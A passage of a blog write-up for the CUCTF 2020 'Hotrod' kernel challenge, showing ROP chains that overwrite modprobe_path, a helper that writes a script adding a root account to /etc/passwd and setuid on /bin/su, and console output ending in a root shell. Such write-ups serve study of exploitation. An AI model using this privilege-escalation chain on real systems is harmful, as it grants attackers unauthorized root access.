+<p>Initially I tried to replace the <code class="highlighter-rouge">read_flag()</code> function with:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="nf">execve_shell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[ERROR] We are not root!"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"[+] We are root!"</span><span class="p">);</span>
+  <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>but this led to a crash every single time.
+So I started debugging the kernel, and I finally found a way to get a shell.</p>
+
+<p>First of all, we need to fix the timerfd_ctx structure that we corrupted in the previous steps. I replaced the first address (idx 0) with the original timerfd_ctx structure address and the sixth address (idx 5, now it is our pivot gadget) with the gadget:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    0xffffffff810001dc: ret;    
+</code></pre></div></div>
+
+<p>So when the function pointer will be called again, the call will simply return.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Fix idx 0x0
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81027b8eUL</span><span class="p">;</span> <span class="c1">// mov rax, rdi; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff8106e24aUL</span><span class="p">;</span> <span class="c1">// mov rsi, rax; sub rsi, rcx; cmp rdx, rax; cmovs r8, rsi; mov rax, r8; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81027b8eUL</span><span class="p">;</span> <span class="c1">// mov rax, rdi; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff810f6180UL</span><span class="p">;</span> <span class="c1">// mov qword ptr [rax], rsi; ret;
+</span>
+<span class="c1">// Fix idx 0x5
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff8113f9b6UL</span><span class="p">;</span> <span class="c1">// pop rdx; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mh">0x28</span><span class="p">;</span>
+<span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81012183UL</span><span class="p">;</span> <span class="c1">// add rax, rdx; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81005b00UL</span><span class="p">;</span> <span class="c1">// pop rsi; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff810001dcUL</span><span class="p">;</span> <span class="c1">// ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff810f6180UL</span><span class="p">;</span> <span class="o">//</span> <span class="n">mov</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rax</span><span class="p">],</span> <span class="n">rsi</span><span class="p">;</span> <span class="n">ret</span><span class="p">;</span></code></pre></figure>
+
+<p>But even after this change, I coudn’t use system/execve/execveat and so on. So how can we get a shell?</p>
+
+<p>In Linux, when an user executes a program with an unknown program header, the system will call <a href="https://elixir.bootlin.com/linux/v5.8.3/source/kernel/kmod.c#L125">__request_module</a> that will call <a href="https://elixir.bootlin.com/linux/v5.8.3/source/kernel/kmod.c#L70">call_modprobe</a> and <code class="highlighter-rouge">call_modprobe</code> will use <a href="https://elixir.bootlin.com/linux/v5.8.3/source/kernel/umh.c#L559">call_usermodehelper_exec</a> to execute the program specified by <a href="https://elixir.bootlin.com/linux/v5.8.3/source/kernel/kmod.c#L62">modprobe_path</a>. <code class="highlighter-rouge">modprobe_path</code> usually corresponds to <code class="highlighter-rouge">/sbin/morprobe</code>.</p>
+
+<p>So if we overwrite <code class="highlighter-rouge">modprobe_path</code> with the location of a script controlled by us, for example <code class="highlighter-rouge">/home/user/x</code>, every time we execute a file with an unknown program header, the system will run our script instead of <code class="highlighter-rouge">/sbin/modprobe</code>.</p>
+
+<p>We can use the following function to automatically create a file with an unknown program header (<code class="highlighter-rouge">/home/user/asd</code>) and the script that will add a new user (<code class="highlighter-rouge">/home/user/x</code>).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">prepare_exploit</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"echo -e '</span><span class="se">\xdd\xdd\xdd\xdd\xdd\xdd</span><span class="s">' &gt; /home/user/asd"</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/user/asd"</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"echo '#!/bin/sh' &gt; /home/user/x"</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"echo 'chmod +s /bin/su' &gt;&gt; /home/user/x"</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"echo 'echo </span><span class="se">\"</span><span class="s">asd:12prjwbMKCxIE:0:0:asd:/root:/bin/sh</span><span class="se">\"</span><span class="s"> &gt;&gt; /etc/passwd' &gt;&gt; /home/user/x"</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/user/x"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Let’s continue our ROP-chain:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Hijack modprobe_path
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff810b689dUL</span><span class="p">;</span> <span class="c1">// pop rdi; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mh">0x73752f656d6f682f</span><span class="p">;</span> <span class="c1">// su/emoh/
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81005b00UL</span><span class="p">;</span> <span class="c1">// pop rsi; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81837c20UL</span><span class="p">;</span> <span class="c1">// modprobe_path
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff810a5417UL</span><span class="p">;</span> <span class="c1">// mov qword ptr [rsi], rdi; ret;
+</span>
+<span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff810b689dUL</span><span class="p">;</span> <span class="c1">// pop rdi; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mh">0x782f7265</span><span class="p">;</span> <span class="c1">// x/re
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81005b00UL</span><span class="p">;</span> <span class="c1">// pop rsi; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81837c20UL</span> <span class="o">+</span> <span class="mi">8UL</span><span class="p">;</span> <span class="c1">// modprobe_path
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff810a5417UL</span><span class="p">;</span> <span class="o">//</span> <span class="n">mov</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsi</span><span class="p">],</span> <span class="n">rdi</span><span class="p">;</span> <span class="n">ret</span><span class="p">;</span></code></pre></figure>
+
+<p>At this point we only need to find a way to avoid kernel crash. To succeed in our goal we can return in userspace after hijacking modprobe_path and simply execute:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="nf">do_nothing</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>In this way, after hijacking modprobe_path, our exploit will successfully exit and we will be able to execute <code class="highlighter-rouge">/home/user/asd</code> to force the kernel executing our malicious script:</p>
+
+<p>(I also tried to trap the thread using int3 and it worked too).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// pkc -&gt; cc -&gt; kpti trampoline -&gt; userspace -&gt; ret
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff810b689dUL</span><span class="p">;</span> <span class="c1">// pop rdi; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81053680UL</span><span class="p">;</span> <span class="c1">// pkc
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff8108bacaUL</span><span class="p">;</span> <span class="c1">// mov rdi, rax; call 0x2d1350; mov rax, -9; pop rbp; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff810537d0UL</span><span class="p">;</span> <span class="c1">// cc
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff8118a8d3UL</span><span class="p">;</span> <span class="c1">// pop rcx; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">do_nothing</span><span class="p">);</span> <span class="c1">// return
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81008b7dUL</span><span class="p">;</span> <span class="c1">// pop r11; pop r12; pop rbp; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">usr_rflags</span><span class="p">;</span>
+<span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// r12
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// rbp
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81200106UL</span><span class="p">;</span> <span class="c1">// kpti_trampoline (sysret)
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// rax
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// rdi
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span> <span class="o">//</span> <span class="n">rsp</span></code></pre></figure>
+
+<p>Is important to note that to maximize the exploit success rate, we need perfect timing. I found the right compromise using <code class="highlighter-rouge">sleep(1.8)</code> before ioctl_userfaultfd and using <code class="highlighter-rouge">0xeae0e65</code> as expiration time.
+I still have to dig deeply to understand why exactly it is needed.</p>
+
+<p>This will be our final exploit: <a href="/assets/files/hotrod/exploit.c">exploit.c</a>, <a href="/assets/files/hotrod/utils.h">utils.h</a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            / $ /home/user/exploit
+            [*] Allocating/Freeing timerfd_ctx structure...
+            [*] Leaking timerfd_tmrproc address...
+            [+] Object dump:
+              0000  0xffff88800029b600    0x0000000000000000      
+              0010  0x0000000000000000    0x00000002dc1b84cb      
+              0020  0x00000002dc1b84cb    0xffffffff81102a00      
+              0030  0xffffffff8183e080    0x0000000000000000      
+              0040  0x0000000000000000    0x0000000000000000      
+              0050  0x0000000000000000    0x0000000000000000      
+              0060  0x0000000000000000    0x0000000000000000      
+              0070  0x0000000000000000    0x0000000000000000      
+              0080  0xbd74d3bf6c2aaa81    0xffff88800029b688      
+              0090  0xffff88800029b688    0x0000000000000000      
+              00a0  0x0000000000000000    0xffff888000157f00      
+              00b0  0x00000000000000a8    0x0000000000000000      
+              00c0  0x0000000000000000    0x0000000000000000      
+              00d0  0x0000000000000000    0x0000000000000000      
+              00e0  0x0000000000000000    0x0000000000000000    
+            [+] Leaked timerfd_ctx structure address: 0xffff88800029b600            
+            [+] Leaked timerfd_tmrproc address: 0xffffffff81102a00
+            [+] Kernel base address: 0xffffffff00000000
+            [+] Modprobe path address: 0xffffffff81837c20
+            [*] Mmapping page...
+            [*] Start monitoring range: 0xdead000 - 0xdeae000
+            [*] Triggering page fault...
+            [+] Page fault at address 0xdead000!
+            [*] Freeing...
+            [*] Creating second timer...
+            [*] Structure will be overwritten with:
+              0000  0x000000000cafe800    0x0000000000000000      
+              0010  0x0000000000000000    0x000000000eae0e65      
+              0020  0x000000000eae0e65    0xffffffff81027b86      
+              0030  0xffffffff8183e080    0x0000000000000000      
+              0040  0x0000000000000000    0x0000000000000000      
+              0050  0x0000000000000000    0x0000000000000000      
+              0060  0x0000000000000000    0x0000000000000000      
+              0070  0x0000000000000000    0x0000000000000000      
+              0080  0xbd74d3bf6c2aaa81    0xffff88800029b688      
+              0090  0xffff88800029b688    0x0000000000000000      
+              00a0  0x0000000000000000    0xffff888000157f00      
+              00b0  0x00000000000000a8    0x0000000000000000      
+              00c0  0x0000000000000000    0x0000000000000000      
+              00d0  0x0000000000000000    0x0000000000000000      
+              00e0  0x0000000000000000    0x0000000000000000    
+            [*] Fake stack at: 0xcafe000
+            [+] Execute: "/home/user/asd" to add a new user: asd / asdasdasd
+            / $ cat /etc/passwd
+            root:x:0:0:root:/root:/bin/sh
+            user:x:1000:1000:Linux User,,,:/home/user:/bin/sh
+            / $ /home/user/asd // [1]
+            /home/user/asd: line 1: ������: not found
+            / $ cat /etc/passwd
+            root:x:0:0:root:/root:/bin/sh
+            user:x:1000:1000:Linux User,,,:/home/user:/bin/sh
+            asd:12prjwbMKCxIE:0:0:asd:/root:/bin/sh // [2]
+            / $ su asd
+            Password:
+            / # id
+            uid=0(root) gid=0(root) groups=0(root)
+            / #
+</code></pre></div></div>
+
+<p>As we can see, when we execute <code class="highlighter-rouge">/home/user/asd</code> <strong>[1]</strong>, the kernel will use <code class="highlighter-rouge">call_modprobe</code>, but since we replaced <code class="highlighter-rouge">modprobe_path</code> with the location of our malicuous script, a new user will be added <strong>[2]</strong>.</p>
+
+<p>Finally, we can enjoy our root shell!</p>
+
+<p>Challenge link: <a href="https://github.com/CUCyber/cuctf-2020-challenges/tree/main/binary-exploitation/Hotrod/distributed">here</a>.</p>
+
+<h3 id="references">References</h3>
+<p><em>SMEP</em></p>
+<ul>
+  <li><a href="https://software.intel.com/sites/default/files/managed/39/c5/325462-sdm-vol-1-2abcd-3abcd.pdf (p. 2860)">https://software.intel.com/sites/default/files/managed/39/c5/325462-sdm-vol-1-2abcd-3abcd.pdf (p. 2860)</a></li>
+</ul>
+
+<p><em>KPTI</em></p>
+<ul>
+  <li><a href="https://www.cs.hs-rm.de/~kaiser/events/wamos2018/Slides/mueller.pdf">https://www.cs.hs-rm.de/~kaiser/events/wamos2018/Slides/mueller.pdf</a> (n. 15)</li>
+  <li><a href="https://www.kernel.org/doc/html/latest/x86/pti.html">https://www.kernel.org/doc/html/latest/x86/pti.html</a></li>
+</ul>
+
+<p><em>Misc devices</em></p>
+<ul>
+  <li><a href="https://www.linuxjournal.com/article/2920">https://www.linuxjournal.com/article/2920</a></li>
+  <li><a href="https://linux-kernel-labs.github.io/refs/heads/master/labs/device_drivers.html">https://linux-kernel-labs.github.io/refs/heads/master/labs/device_drivers.html</a></li>
+</ul>
+
+<p><em>Slab allocator</em></p>
+<ul>
+  <li><a href="https://www.kernel.org/doc/gorman/html/understand/understand011.html">https://www.kernel.org/doc/gorman/html/understand/understand011.html</a></li>
+  <li><a href="https://hammertux.github.io/slab-allocator">https://hammertux.github.io/slab-allocator</a></li>
+  <li><a href="https://argp.github.io/2012/01/03/linux-kernel-heap-exploitation/">https://argp.github.io/2012/01/03/linux-kernel-heap-exploitation/</a></li>
+</ul>
+
+<p><em>timerfd_ctx</em></p>
+<ul>
+  <li><a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628</a></li>
+  <li><a href="https://rpis.ec/blog/tokyowesterns-2019-gnote/">https://rpis.ec/blog/tokyowesterns-2019-gnote/</a></li>
+</ul>
+
+<p><em>Userfaultfd</em></p>
+<ul>
+  <li><a href="https://blog.lizzie.io/using-userfaultfd.html">https://blog.lizzie.io/using-userfaultfd.html</a></li>
+  <li><a href="https://makedist.com/posts/2016/10/10/measuring-userfaultfd-page-fault-latency/">https://makedist.com/posts/2016/10/10/measuring-userfaultfd-page-fault-latency/</a></li>
+</ul>
+
+<p><em>Exploit scheme</em></p>
+<ul>
+  <li><a href="http://asciiflow.com/">http://asciiflow.com/</a></li>
+</ul>
+
+<p><em>modprobe_path</em></p>
+<ul>
+  <li><a href="https://www.jianshu.com/p/a2259cd3e79e">https://www.jianshu.com/p/a2259cd3e79e</a></li>
+</ul>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+                <!-- #author-->
+                
+                    
+                        <section class="author-card">
+                            
+                                <img class="author-profile-image" src="/assets/images/ghost.png" alt="D3v17" />
+                            
+                            <section class="author-card-content">
+                                <h4 class="author-card-name"><a href="/author/D3v17">D3v17</a></h4>
+                                
+                                    <p>Read <a href="/author/D3v17">more posts</a> by this author.</p>
+                                
+                            </section>
+                        </section>
+                        <div class="post-full-footer-right">
+                            <a class="author-card-button" href="/author/D3v17">Read More</a>
+                        </div>
+                    
+                
+                <!-- /author  -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+<!-- Links to Previous/Next posts -->
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+            
+                
+                
+                
+                
+            
+
+            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/sudo-heap-overflow">
+                <div class="post-card-image" style="background-image: url(/assets/images/sudo_heap_overflow/title.png)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/sudo-heap-overflow">
+                <header class="post-card-header">
+                    
+                        
+                            
+                                <span class="post-card-tags">Research</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">[CVE-2021-3156] Exploiting Sudo heap overflow on Debian 10</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p></p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/ghost.png" alt="D3v17" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/D3v17/">D3v17</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      1 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/ret2dl_resolve">
+                <div class="post-card-image" style="background-image: url(/assets/images/ret2dl_resolve/title.jpg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/ret2dl_resolve">
+                <header class="post-card-header">
+                    
+                        
+                            
+                                <span class="post-card-tags">Research</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">Ret2dl_resolve x64</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p></p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/ghost.png" alt="D3v17" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/D3v17/">D3v17</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      1 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+        </div>
+    </div>
+</aside>
+
+<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
+<div class="floating-header">
+    <div class="floating-header-logo">
+        <a href="https://syst3mfailure.io/">
+            
+            <span>Syst3m Failure</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">&mdash;</span>
+    <div class="floating-header-title">[CUCTF 2020] Kernel Exploitation: Hotrod</div>
+    <div class="floating-header-share">
+        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
+</svg>
+</div>
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=%5BCUCTF+2020%5D+Kernel+Exploitation%3A+Hotrod&amp;url=https://syst3mfailure.io/hotrod"
+            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+
+        </a>
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://syst3mfailure.io/hotrod"
+            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
+
+        </a>
+    </div>
+    <progress class="progress" value="0">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+
+
+<!-- /post -->
+
+<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->
+
+
+        <!-- Previous/next page links - displayed on every page -->
+
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://syst3mfailure.io/">Syst3m Failure</a> &copy; 2021</section>
+                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
+                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
+                    <a href="https://github.com/jekyller/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                    
+                    
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
